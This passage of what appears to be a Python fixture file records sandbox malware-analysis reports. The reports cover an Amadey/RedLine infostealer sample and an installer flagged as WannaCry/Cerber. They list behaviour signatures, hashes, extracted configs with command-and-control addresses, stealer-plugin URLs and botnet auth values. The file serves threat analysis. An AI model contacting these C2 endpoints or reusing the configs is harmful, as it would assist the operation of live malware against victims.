            "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a.xlsm",
        },
        "211228-jjytnscbdn-static1": {
            "kind": "static",
            "name": "static1",
            "score": 8,
            "status": "reported",
            "tags": ["macro"],
        },
    },
    "version": "0.2.3",
}

query_230220_tbqs7sah7x = {
    "version": "0.2.3",
    "sample": {
        "id": "230220-tbqs7sah7x",
        "score": 10,
        "target": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
        "size": 1118720,
        "md5": "0975c6819cc2c657b6fb6fcc0cc3fea0",
        "sha1": "5361dbd526a501fc7a7acfdba5b1c4f11e2fddaf",
        "sha256": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
        "sha512": "6fbeefdee3f0158bb32c162ef4bd6622d28d9745061238211fb90fca1e9a75b3"
        "548233b00c607ab180084fabc9989bee74d6b45c6c9ada5a79e23bff6f0c31cd",
        "ssdeep": "24576:DyOv/uT80oe5rUHqWXaQZavFL6pdSVwqyHX7Y/tyAE4mxO6wAh:WOv/uUe5rUfXxWxkdSCvHrr4mxO",
        "created": "2023-02-20T15:53:15Z",
        "completed": "2023-02-20T15:55:49Z",
    },
    "tasks": [
        {
            "sample": "230220-tbqs7sah7x",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": [
                "family:amadey",
                "family:redline",
                "botnet:fuma",
                "botnet:kk1",
                "botnet:ronam",
                "discovery",
                "evasion",
                "infostealer",
                "persistence",
                "spyware",
                "stealer",
                "trojan",
            ],
            "score": 10,
            "target": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46.exe",
            "backend": "sbx4m11",
            "resource": "win10-20220812-en",
            "task_name": "dridex",
            "os": "windows10-1703-x64",
            "timeout": 150,
            "sigs": 17,
        },
        {"sample": "230220-tbqs7sah7x", "kind": "static", "name": "static1", "status": "reported", "score": 1},
    ],
    "analysis": {
        "score": 10,
        "family": ["amadey", "redline"],
        "tags": [
            "family:amadey",
            "family:redline",
            "botnet:fuma",
            "botnet:kk1",
            "botnet:ronam",
            "discovery",
            "evasion",
            "infostealer",
            "persistence",
            "spyware",
            "stealer",
            "trojan",
        ],
    },
    "targets": [
        {
            "tasks": ["behavioral1"],
            "score": 10,
            "target": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
            "size": 1118720,
            "md5": "0975c6819cc2c657b6fb6fcc0cc3fea0",
            "sha1": "5361dbd526a501fc7a7acfdba5b1c4f11e2fddaf",
            "sha256": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
            "sha512": "6fbeefdee3f0158bb32c162ef4bd6622d28d9745061238211fb90fca1e9a75b3"
            "548233b00c607ab180084fabc9989bee74d6b45c6c9ada5a79e23bff6f0c31cd",
            "ssdeep": "24576:DyOv/uT80oe5rUHqWXaQZavFL6pdSVwqyHX7Y/tyAE4mxO6wAh:WOv/uUe5rUfXxWxkdSCvHrr4mxO",
            "tags": [
                "family:amadey",
                "family:redline",
                "botnet:fuma",
                "botnet:kk1",
                "botnet:ronam",
                "discovery",
                "evasion",
                "infostealer",
                "persistence",
                "spyware",
                "stealer",
                "trojan",
            ],
            "family": ["amadey", "redline"],
            "signatures": [
                {
                    "label": "amadey",
                    "name": "Amadey",
                    "score": 10,
                    "tags": ["trojan", "family:amadey"],
                    "desc": "Amadey bot is a simple trojan bot primarily used for "
                    "collecting reconnaissance information.",
                },
                {
                    "label": "modifies_realtime_protection_registry",
                    "name": "Modifies Windows Defender Real-time Protection settings",
                    "score": 10,
                    "ttp": ["T1112", "T1031", "T1089"],
                    "tags": ["evasion", "trojan"],
                },
                {
                    "label": "redline",
                    "name": "RedLine",
                    "score": 10,
                    "tags": ["infostealer", "family:redline"],
                    "desc": "RedLine Stealer is a malware family written in C#, first appearing in early 2020.",
                },
                {
                    "name": "RedLine payload",
                    "score": 10,
                    "indicators": [
                        {
                            "resource": "behavioral1/memory/4924-438-"
                            "0x0000000002260000-0x00000000022A6000-memory.dmp",
                            "yara_rule": "family_redline",
                        },
                        {
                            "resource": "behavioral1/memory/4924-443-0x00000000023F0000-"
                            "0x0000000002434000-memory.dmp",
                            "yara_rule": "family_redline",
                        },
                    ],
                },
                {"name": "Executes dropped EXE", "score": 7},
                {"name": "Loads dropped DLL", "score": 7},
                {
                    "label": "browser_user_data_harvesting",
                    "name": "Reads user/profile data of web browsers",
                    "score": 7,
                    "ttp": ["T1005", "T1081"],
                    "tags": ["spyware", "stealer"],
                    "desc": "Infostealers often target stored browser data, which can include saved credentials etc.",
                },
                {
                    "label": "modifies_windows_security_registry",
                    "name": "Windows security modification",
                    "score": 7,
                    "ttp": ["T1089", "T1112"],
                    "tags": ["evasion", "trojan"],
                },
                {
                    "label": "sig_crypto_wallet",
                    "name": "Accesses cryptocurrency files/wallets, possible credential harvesting",
                    "score": 6,
                    "ttp": ["T1005", "T1081"],
                    "tags": ["spyware"],
                },
                {
                    "label": "creates_runkey_registry",
                    "name": "Adds Run key to start application",
                    "score": 6,
                    "ttp": ["T1060", "T1112"],
                    "tags": ["persistence"],
                },
                {
                    "label": "checks_uninstall_regkeys",
                    "name": "Checks installed software on the system",
                    "score": 6,
                    "ttp": ["T1012"],
                    "tags": ["discovery"],
                    "desc": "Looks up Uninstall key entries in the registry to enumerate software on the system.",
                },
                {"name": "Suspicious use of SetThreadContext", "score": 5},
                {
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                    "desc": "Attempts to interact with connected "
                    "storage/optical drive(s). Likely ransomware behaviour.",
                },
                {
                    "label": "schtasks_persist",
                    "name": "Creates scheduled task(s)",
                    "ttp": ["T1053"],
                    "tags": ["persistence"],
                    "desc": "Schtasks is often used by malware "
                    "for persistence or to perform post-infection execution.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "iocs": {
                "urls": [
                    "http://193.233.20.15/dF30Hn4m/index.php",
                    "http://193.233.20.15/dF30Hn4m/Plugins/cred64.dll",
                    "http://193.233.20.15/dF30Hn4m/Plugins/clip64.dll",
                ],
                "ips": [
                    "193.233.20.17",
                    "51.11.192.50",
                    "176.113.115.17",
                    "8.238.23.254",
                    "193.233.20.15",
                    "93.184.220.29",
                ],
            },
        }
    ],
    "signatures": [
        {
            "label": "amadey",
            "name": "Amadey",
            "score": 10,
            "tags": ["trojan", "family:amadey"],
            "desc": "Amadey bot is a simple trojan bot primarily used for collecting reconnaissance inf.",
        },
        {
            "label": "modifies_realtime_protection_registry",
            "name": "Modifies Windows Defender Real-time Protection settings",
            "score": 10,
            "ttp": ["T1112", "T1031", "T1089"],
            "tags": ["evasion", "trojan"],
        },
        {
            "label": "redline",
            "name": "RedLine",
            "score": 10,
            "tags": ["infostealer", "family:redline"],
            "desc": "RedLine Stealer is a malware family written in C#, first appearing in early 2020.",
        },
        {
            "name": "RedLine payload",
            "score": 10,
            "indicators": [
                {
                    "resource": "behavioral1/memory/4924-438-0x0000000002260000-0x00000000022A6000-memory.dmp",
                    "yara_rule": "family_redline",
                },
                {
                    "resource": "behavioral1/memory/4924-443-0x00000000023F0000-0x0000000002434000-memory.dmp",
                    "yara_rule": "family_redline",
                },
            ],
        },
        {"name": "Executes dropped EXE", "score": 7},
        {"name": "Loads dropped DLL", "score": 7},
        {
            "label": "browser_user_data_harvesting",
            "name": "Reads user/profile data of web browsers",
            "score": 7,
            "ttp": ["T1005", "T1081"],
            "tags": ["spyware", "stealer"],
            "desc": "Infostealers often target stored browser data, which can include saved credentials etc.",
        },
        {
            "label": "modifies_windows_security_registry",
            "name": "Windows security modification",
            "score": 7,
            "ttp": ["T1089", "T1112"],
            "tags": ["evasion", "trojan"],
        },
        {
            "label": "sig_crypto_wallet",
            "name": "Accesses cryptocurrency files/wallets, possible credential harvesting",
            "score": 6,
            "ttp": ["T1005", "T1081"],
            "tags": ["spyware"],
        },
        {
            "label": "creates_runkey_registry",
            "name": "Adds Run key to start application",
            "score": 6,
            "ttp": ["T1060", "T1112"],
            "tags": ["persistence"],
        },
        {
            "label": "checks_uninstall_regkeys",
            "name": "Checks installed software on the system",
            "score": 6,
            "ttp": ["T1012"],
            "tags": ["discovery"],
            "desc": "Looks up Uninstall key entries in the registry to enumerate software on the system.",
        },
        {"name": "Suspicious use of SetThreadContext", "score": 5},
        {
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware.",
        },
        {
            "label": "schtasks_persist",
            "name": "Creates scheduled task(s)",
            "ttp": ["T1053"],
            "tags": ["persistence"],
            "desc": "Schtasks is often used by malware for persistence or to perform post-infection exec.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/4924-438-0x0000000002260000-0x00000000022A6000-memory.dmp",
            "resource": "behavioral1/memory/4924-438-0x0000000002260000-0x00000000022A6000-memory.dmp",
            "config": {"family": "redline", "rule": "RedLine"},
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/4924-443-0x00000000023F0000-0x0000000002434000-memory.dmp",
            "resource": "behavioral1/memory/4924-443-0x00000000023F0000-0x0000000002434000-memory.dmp",
            "config": {
                "family": "redline",
                "rule": "RedLine",
                "c2": ["193.233.20.17:4139"],
                "botnet": "ronam",
                "attr": {"auth_value": "125421d19d14dd7fd211bc7f6d4aea6c"},
            },
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "files/0x000600000001ac25-492.dat",
            "resource": "behavioral1/files/0x000600000001ac25-492.dat",
            "config": {
                "family": "redline",
                "rule": "RedLine",
                "c2": ["193.233.20.17:4139"],
                "botnet": "fuma",
                "attr": {"auth_value": "116ab7335d0316d186d563bd6d41b9dd"},
            },
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "files/0x000800000001ac1c-630.dat",
            "resource": "behavioral1/files/0x000800000001ac1c-630.dat",
            "config": {
                "family": "amadey",
                "rule": "AmadeyV2",
                "c2": ["193.233.20.15/dF30Hn4m/index.php"],
                "version": "3.67",
            },
        },
        {
            "tasks": ["behavioral1"],
            "dumped_file": "memory/4340-722-0x0000000000400000-0x0000000000432000-memory.dmp",
            "resource": "behavioral1/memory/4340-722-0x0000000000400000-0x0000000000432000-memory.dmp",
            "config": {
                "family": "redline",
                "rule": "RedLine",
                "c2": ["176.113.115.17:4132"],
                "botnet": "kk1",
                "attr": {"auth_value": "df169d3f7f631272f7c6bd9a1bb603c3"},
            },
        },
    ],
}

query_240828_btyyeszang_static = {
    "version": "0.2",
    "sample": {"sample": "240828-btyyeszang", "kind": "file", "size": 26508648, "target": "python-3.12.5-amd64.exe"},
    "task": {"task": "240828-btyyeszang-static1", "target": "python-3.12.5-amd64.exe"},
    "analysis": {"reported": "2024-08-28T01:26:53Z", "score": 1},
    "files": [
        {
            "filename": "python-3.12.5-amd64.exe",
            "filesize": 26508648,
            "md5": "bbcb2fcf9d739f776fb6414afc12c80d",
            "sha1": "2d78877db5a8da134ab54ed952b961a7e750ec7d",
            "sha256": "44810512af577ca70b3269b8570b10825ec2ace2b86e4297e767a0f4c0ee8bfd",
            "sha512": "0572c6345f6a4f7f3e5c2ff858e3ca7ca54ae4478f3d59d8e18cb0f596e61dcf12aef579db229e83d63b30f15d6684ee6bb3feaea9413e5e636a503933057678",
            "ssdeep": "786432:jKEO2c6viGKJXI95MB6K3qtY9a3YiVTfwtzWo2CB8:XHiRuVKCY9a3YiRws6B8",
            "exts": [".exe"],
            "tags": ["windows:6", "windows", "x86", "arch:x86"],
            "depth": 0,
            "kind": "file",
            "selected": True,
            "runas": "python-3.12.5-amd64.exe",
            "metadata": {
                "pe": {
                    "timestamp": 1632326298,
                    "imports": [
                        {
                            "dll_name": "advapi32",
                            "imports": [
                                "RegCloseKey",
                                "RegOpenKeyExW",
                                "OpenProcessToken",
                                "AdjustTokenPrivileges",
                                "LookupPrivilegeValueW",
                                "InitiateSystemShutdownExW",
                                "GetUserNameW",
                                "RegQueryValueExW",
                                "RegDeleteValueW",
                                "CloseEventLog",
                                "OpenEventLogW",
                                "ReportEventW",
                                "ConvertStringSecurityDescriptorToSecurityDescriptorW",
                                "CreateWellKnownSid",
                                "InitializeAcl",
                                "DecryptFileW",
                                "SetEntriesInAclW",
                                "ChangeServiceConfigW",
                                "CloseServiceHandle",
                                "ControlService",
                                "OpenSCManagerW",
                                "OpenServiceW",
                                "QueryServiceStatus",
                                "SetNamedSecurityInfoW",
                                "CheckTokenMembership",
                                "AllocateAndInitializeSid",
                                "SetEntriesInAclA",
                                "SetSecurityDescriptorOwner",
                                "SetSecurityDescriptorGroup",
                                "SetSecurityDescriptorDacl",
                                "InitializeSecurityDescriptor",
                                "RegSetValueExW",
                                "RegQueryInfoKeyW",
                                "RegEnumValueW",
                                "RegEnumKeyExW",
                                "RegDeleteKeyW",
                                "RegCreateKeyExW",
                                "GetTokenInformation",
                                "CryptDestroyHash",
                                "CryptHashData",
                                "CryptCreateHash",
                                "CryptGetHashParam",
                                "CryptReleaseContext",
                                "CryptAcquireContextW",
                                "QueryServiceConfigW",
                            ],
                        },
                        {
                            "dll_name": "user32",
                            "imports": [
                                "PeekMessageW",
                                "PostMessageW",
                                "IsWindow",
                                "WaitForInputIdle",
                                "PostQuitMessage",
                                "GetMessageW",
                                "TranslateMessage",
                                "MsgWaitForMultipleObjects",
                                "PostThreadMessageW",
                                "GetMonitorInfoW",
                                "MonitorFromPoint",
                                "IsDialogMessageW",
                                "LoadCursorW",
                                "LoadBitmapW",
                                "SetWindowLongW",
                                "GetWindowLongW",
                                "GetCursorPos",
                                "MessageBoxW",
                                "CreateWindowExW",
                                "UnregisterClassW",
                                "RegisterClassW",
                                "DefWindowProcW",
                                "DispatchMessageW",
                            ],
                        },
                        {
                            "dll_name": "oleaut32",
                            "imports": ["VariantInit", "SysAllocString", "VariantClear", "SysFreeString"],
                        },
                        {
                            "dll_name": "gdi32",
                            "imports": [
                                "DeleteDC",
                                "DeleteObject",
                                "SelectObject",
                                "StretchBlt",
                                "GetObjectW",
                                "CreateCompatibleDC",
                            ],
                        },
                        {
                            "dll_name": "shell32",
                            "imports": ["CommandLineToArgvW", "SHGetFolderPathW", "ShellExecuteExW"],
                        },
                        {
                            "dll_name": "ole32",
                            "imports": [
                                "CoUninitialize",
                                "CoInitializeEx",
                                "CoInitialize",
                                "StringFromGUID2",
                                "CoCreateInstance",
                                "CoTaskMemFree",
                                "CoInitializeSecurity",
                                "CLSIDFromProgID",
                            ],
                        },
                        {
                            "dll_name": "kernel32",
                            "imports": [
                                "GetCPInfo",
                                "GetOEMCP",
                                "GetACP",
                                "CreateFileW",
                                "CloseHandle",
                                "GetLastError",
                                "HeapSetInformation",
                                "GetModuleHandleW",
                                "GetProcAddress",
                                "LocalFree",
                                "FormatMessageW",
                                "lstrlenA",
                                "lstrlenW",
                                "MultiByteToWideChar",
                                "WideCharToMultiByte",
                                "LCMapStringW",
                                "ExpandEnvironmentStringsW",
                                "CreateDirectoryW",
                                "GetFullPathNameW",
                                "GetTempFileNameW",
                                "GetTempPathW",
                                "Sleep",
                                "GetLocalTime",
                                "GetModuleFileNameW",
                                "CompareStringW",
                                "CreateFileA",
                                "SetFilePointer",
                                "WriteFile",
                                "GetCurrentProcessId",
                                "GetSystemDirectoryW",
                                "LoadLibraryW",
                                "HeapAlloc",
                                "HeapReAlloc",
                                "HeapFree",
                                "HeapSize",
                                "GetCommandLineA",
                                "SetCurrentDirectoryW",
                                "GetCurrentDirectoryW",
                                "DeleteFileW",
                                "FindClose",
                                "FindFirstFileW",
                                "FindNextFileW",
                                "GetFileAttributesW",
                                "RemoveDirectoryW",
                                "SetFileAttributesW",
                                "MoveFileExW",
                                "InitializeCriticalSection",
                                "DeleteCriticalSection",
                                "ReleaseMutex",
                                "GetCurrentProcess",
                                "GetCurrentThreadId",
                                "TlsAlloc",
                                "TlsGetValue",
                                "TlsSetValue",
                                "TlsFree",
                                "CreateProcessW",
                                "GetVersionExW",
                                "VerSetConditionMask",
                                "GetVolumePathNameW",
                                "EnterCriticalSection",
                                "LeaveCriticalSection",
                                "GetSystemTime",
                                "GetWindowsDirectoryW",
                                "GetNativeSystemInfo",
                                "GetCommandLineW",
                                "FreeLibrary",
                                "GetModuleHandleExW",
                                "GetComputerNameW",
                                "VerifyVersionInfoW",
                                "GetDateFormatW",
                                "GetUserDefaultUILanguage",
                                "GetUserDefaultLangID",
                                "GetSystemDefaultLangID",
                                "GetStringTypeW",
                                "ReadFile",
                                "SetFilePointerEx",
                                "DuplicateHandle",
                                "LoadLibraryExW",
                                "CreateEventW",
                                "ProcessIdToSessionId",
                                "ConnectNamedPipe",
                                "SetNamedPipeHandleState",
                                "CreateNamedPipeW",
                                "WaitForSingleObject",
                                "GetProcessId",
                                "OpenProcess",
                                "CreateThread",
                                "GetExitCodeThread",
                                "SetEvent",
                                "WaitForMultipleObjects",
                                "LocalFileTimeToFileTime",
                                "SetEndOfFile",
                                "SetFileTime",
                                "ResetEvent",
                                "DosDateTimeToFileTime",
                                "CompareStringA",
                                "GetExitCodeProcess",
                                "SetThreadExecutionState",
                                "CopyFileExW",
                                "CreateMutexW",
                                "CreateFileMappingW",
                                "MapViewOfFile",
                                "UnmapViewOfFile",
                                "GetThreadLocale",
                                "IsValidCodePage",
                                "FindFirstFileExW",
                                "GetEnvironmentStringsW",
                                "FreeEnvironmentStringsW",
                                "SetStdHandle",
                                "GetFileSizeEx",
                                "FlushFileBuffers",
                                "GetConsoleCP",
                                "GetConsoleMode",
                                "DecodePointer",
                                "WriteConsoleW",
                                "GetModuleHandleA",
                                "GlobalAlloc",
                                "GlobalFree",
                                "CopyFileW",
                                "VirtualAlloc",
                                "VirtualFree",
                                "SystemTimeToTzSpecificLocalTime",
                                "SystemTimeToFileTime",
                                "GetTimeZoneInformation",
                                "GetSystemInfo",
                                "VirtualProtect",
                                "VirtualQuery",
                                "GetSystemWow64DirectoryW",
                                "GetProcessHeap",
                                "GetFileType",
                                "ExitProcess",
                                "GetStdHandle",
                                "InitializeCriticalSectionAndSpinCount",
                                "SetLastError",
                                "RtlUnwind",
                                "RaiseException",
                                "UnhandledExceptionFilter",
                                "SetUnhandledExceptionFilter",
                                "TerminateProcess",
                                "IsProcessorFeaturePresent",
                                "QueryPerformanceCounter",
                                "GetSystemTimeAsFileTime",
                                "InitializeSListHead",
                                "IsDebuggerPresent",
                                "GetStartupInfoW",
                                "LoadLibraryExA",
                            ],
                        },
                        {"dll_name": "rpcrt4", "imports": ["UuidCreate"]},
                    ],
                    "sections": [
                        {
                            "name": ".text",
                            "offset": 1024,
                            "virtual_size": 302019,
                            "size": 302080,
                            "characteristics": ["IMAGE_SCN_CNT_CODE", "IMAGE_SCN_MEM_EXECUTE", "IMAGE_SCN_MEM_READ"],
                        },
                        {
                            "name": ".rdata",
                            "offset": 303104,
                            "virtual_size": 127604,
                            "size": 128000,
                            "characteristics": ["IMAGE_SCN_CNT_INITIALIZED_DATA", "IMAGE_SCN_MEM_READ"],
                        },
                        {
                            "name": ".data",
                            "offset": 431104,
                            "virtual_size": 6164,
                            "size": 3072,
                            "characteristics": [
                                "IMAGE_SCN_CNT_INITIALIZED_DATA",
                                "IMAGE_SCN_MEM_READ",
                                "IMAGE_SCN_MEM_WRITE",
                            ],
                        },
                        {
                            "name": ".wixburn",
                            "offset": 434176,
                            "virtual_size": 56,
                            "size": 512,
                            "characteristics": ["IMAGE_SCN_CNT_INITIALIZED_DATA", "IMAGE_SCN_MEM_READ"],
                        },
                        {
                            "name": ".rsrc",
                            "offset": 434688,
                            "virtual_size": 91644,
                            "size": 91648,
                            "characteristics": ["IMAGE_SCN_CNT_INITIALIZED_DATA", "IMAGE_SCN_MEM_READ"],
                        },
                        {
                            "name": ".reloc",
                            "offset": 526336,
                            "virtual_size": 15804,
                            "size": 15872,
                            "characteristics": [
                                "IMAGE_SCN_CNT_INITIALIZED_DATA",
                                "IMAGE_SCN_MEM_DISCARDABLE",
                                "IMAGE_SCN_MEM_READ",
                            ],
                        },
                    ],
                    "header": {
                        "entry_point": 188546,
                        "magic_number": 267,
                        "dll_characteristics": [
                            "IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE",
                            "IMAGE_DLLCHARACTERISTICS_NX_COMPAT",
                            "IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE",
                        ],
                        "major_operating_system_version": 6,
                        "minor_operating_system_version": 0,
                        "subsystem": "IMAGE_SUBSYSTEM_WINDOWS_GUI",
                        "file_characteristics": [
                            "IMAGE_FILE_EXECUTABLE_IMAGE",
                            "IMAGE_FILE_32BIT_MACHINE",
                            "IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP",
                            "IMAGE_FILE_NET_RUN_FROM_SWAP",
                        ],
                        "pdb_paths": ["C:\\agent\\_work\\138\\s\\build\\ship\\x86\\burn.pdb"],
                    },
                    "code_sign": {
                        "signers": [
                            {
                                "digest_algorithm": "sha256",
                                "actual_pe_digest": "bb:7b:a2:a7:1e:c9:05:94:de:95:d0:58:44:51:3f:c2:ef:1b:f9:19:5c:48:b7:ef:5a:de:15:30:df:d2:a6:75",
                                "pe_digests_matches": True,
                                "validity": {
                                    "trusted": True,
                                    "signature_validations": [
                                        {
                                            "signing_certificate": "CN=Python Software Foundation,O=Python Software Foundation,L=Beaverton,ST=Oregon,C=US",
                                            "verifications": [
                                                {
                                                    "is_valid": True,
                                                    "timestamp": "2024-08-06T21:13:59Z",
                                                    "chains": [
                                                        [
                                                            "CN=Python Software Foundation,O=Python Software Foundation,L=Beaverton,ST=Oregon,C=US",
                                                            "CN=DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1,O=DigiCert\\, Inc.,C=US",
                                                            "CN=DigiCert Trusted Root G4,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                                        ],
                                                        [
                                                            "CN=Python Software Foundation,O=Python Software Foundation,L=Beaverton,ST=Oregon,C=US",
                                                            "CN=DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1,O=DigiCert\\, Inc.,C=US",
                                                            "CN=DigiCert Trusted Root G4,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                                            "CN=DigiCert Assured ID Root CA,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                                        ],
                                                    ],
                                                }
                                            ],
                                        }
                                    ],
                                },
                            }
                        ],
                        "certificates": [
                            {
                                "issuer": "CN=DigiCert Trusted Root G4,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                "subject": "CN=DigiCert Trusted Root G4,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                "not_before": "2013-08-01T12:00:00Z",
                                "not_after": "2038-01-15T12:00:00Z",
                                "serial_number": "05:9b:1b:57:9e:8e:21:32:e2:39:07:bd:a7:77:75:5c",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": "null",
                            },
                            {
                                "issuer": "CN=DigiCert Trusted Root G4,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                "subject": "CN=DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1,O=DigiCert\\, Inc.,C=US",
                                "not_before": "2021-04-29T00:00:00Z",
                                "not_after": "2036-04-28T23:59:59Z",
                                "serial_number": "08:ad:40:b2:60:d2:9c:4c:9f:5e:cd:a9:bd:93:ae:d9",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": ["ExtKeyUsageCodeSigning"],
                                "cdps": ["http://crl3.digicert.com/DigiCertTrustedRootG4.crl"],
                            },
                            {
                                "issuer": "CN=DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1,O=DigiCert\\, Inc.,C=US",
                                "subject": "CN=Python Software Foundation,O=Python Software Foundation,L=Beaverton,ST=Oregon,C=US",
                                "not_before": "2022-01-17T00:00:00Z",
                                "not_after": "2025-01-15T23:59:59Z",
                                "serial_number": "07:1f:14:1b:8b:30:0d:25:f3:14:eb:23:0c:d0:d1:dd",
                                "key_usages": ["KeyUsageDigitalSignature"],
                                "ext_key_usages": ["ExtKeyUsageCodeSigning"],
                                "cdps": [
                                    "http://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl",
                                    "http://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl",
                                ],
                            },
                            {
                                "issuer": "CN=DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA,O=DigiCert\\, Inc.,C=US",
                                "subject": "CN=DigiCert Timestamp 2023,O=DigiCert\\, Inc.,C=US",
                                "not_before": "2023-07-14T00:00:00Z",
                                "not_after": "2034-10-13T23:59:59Z",
                                "serial_number": "05:44:af:f3:94:9d:08:39:a6:bf:db:3f:5f:e5:61:16",
                                "key_usages": ["KeyUsageDigitalSignature"],
                                "ext_key_usages": ["ExtKeyUsageTimeStamping"],
                                "cdps": ["http://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl"],
                            },
                            {
                                "issuer": "CN=DigiCert Trusted Root G4,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                "subject": "CN=DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA,O=DigiCert\\, Inc.,C=US",
                                "not_before": "2022-03-23T00:00:00Z",
                                "not_after": "2037-03-22T23:59:59Z",
                                "serial_number": "07:36:37:b7:24:54:7c:d8:47:ac:fd:28:66:2a:5e:5b",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": ["ExtKeyUsageTimeStamping"],
                                "cdps": ["http://crl3.digicert.com/DigiCertTrustedRootG4.crl"],
                            },
                            {
                                "issuer": "CN=DigiCert Assured ID Root CA,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                "subject": "CN=DigiCert Trusted Root G4,OU=www.digicert.com,O=DigiCert Inc,C=US",
                                "not_before": "2022-08-01T00:00:00Z",
                                "not_after": "2031-11-09T23:59:59Z",
                                "serial_number": "0e:9b:18:8e:f9:d0:2d:e7:ef:db:50:e2:08:40:18:5a",
                                "key_usages": ["KeyUsageDigitalSignature", "KeyUsageCertSign", "KeyUsageCRLSign"],
                                "ext_key_usages": "null",
                                "cdps": ["http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl"],
                            },
                        ],
                    },
                    "imphash": "f57d7a40ebfca87e6f8082251d937ed8",
                    "subtype": {
                        "type": "generic",
                        "generic": {
                            "rich": [
                                {"count": 10, "version": 26213, "id": 259},
                                {"count": 143, "version": 26213, "id": 261},
                                {"count": 19, "version": 26706, "id": 260},
                                {"count": 19, "version": 26706, "id": 259},
                                {"count": 43, "version": 26706, "id": 261},
                                {"count": 21, "version": 26213, "id": 260},
                                {"count": 2, "version": 26213, "id": 262},
                                {"count": 17, "version": 26213, "id": 257},
                                {"count": 334, "productName": "Unmarked objects", "id": 1},
                                {"count": 75, "version": 27045, "id": 261},
                                {"count": 1, "version": 27045, "id": 255},
                                {"count": 2, "id": 151},
                                {"count": 1, "version": 27045, "id": 258},
                            ]
                        },
                    },
                }
            },
        }
    ],
    "unpack_count": 0,
    "error_count": 0,
}

query_240828_btyyeszang = {
    "version": "0.3.0",
    "sample": {
        "id": "240828-btyyeszang",
        "score": 10,
        "target": "python-3.12.5-amd64.exe",
        "size": 26508648,
        "md5": "bbcb2fcf9d739f776fb6414afc12c80d",
        "sha1": "2d78877db5a8da134ab54ed952b961a7e750ec7d",
        "sha256": "44810512af577ca70b3269b8570b10825ec2ace2b86e4297e767a0f4c0ee8bfd",
        "sha512": "0572c6345f6a4f7f3e5c2ff858e3ca7ca54ae4478f3d59d8e18cb0f596e61dcf12aef579db229e83d63b30f15d6684ee6bb3feaea9413e5e636a503933057678",
        "ssdeep": "786432:jKEO2c6viGKJXI95MB6K3qtY9a3YiVTfwtzWo2CB8:XHiRuVKCY9a3YiRws6B8",
        "created": "2024-08-28T01:26:49Z",
        "completed": "2024-08-28T01:47:11Z",
    },
    "tasks": [
        {
            "sample": "240828-btyyeszang",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": ["discovery"],
            "score": 4,
            "target": "python-3.12.5-amd64.exe",
            "backend": "sbx4m61",
            "resource": "win10-20240404-en",
            "os": "windows10-1703-x64",
            "timeout": 600,
            "sigs": 12,
        },
        {
            "sample": "240828-btyyeszang",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": [
                "family:wannacry",
                "",
                "defense_evasion",
                "discovery",
                "execution",
                "impact",
                "persistence",
                "ransomware",
                "spyware",
                "stealer",
                "worm",
            ],
            "score": 10,
            "target": "python-3.12.5-amd64.exe",
            "backend": "sbx4m77",
            "resource": "win10v2004-20240802-en",
            "os": "windows10-2004-x64",
            "timeout": 600,
            "sigs": 31,
        },
        {
            "sample": "240828-btyyeszang",
            "kind": "behavioral",
            "name": "behavioral3",
            "status": "reported",
            "tags": [
                "family:cerber",
                "family:wannacry",
                "",
                "defense_evasion",
                "discovery",
                "evasion",
                "execution",
                "impact",
                "persistence",
                "privilege_escalation",
                "ransomware",
                "worm",
            ],
            "score": 10,
            "target": "python-3.12.5-amd64.exe",
            "backend": "sbx4m75",
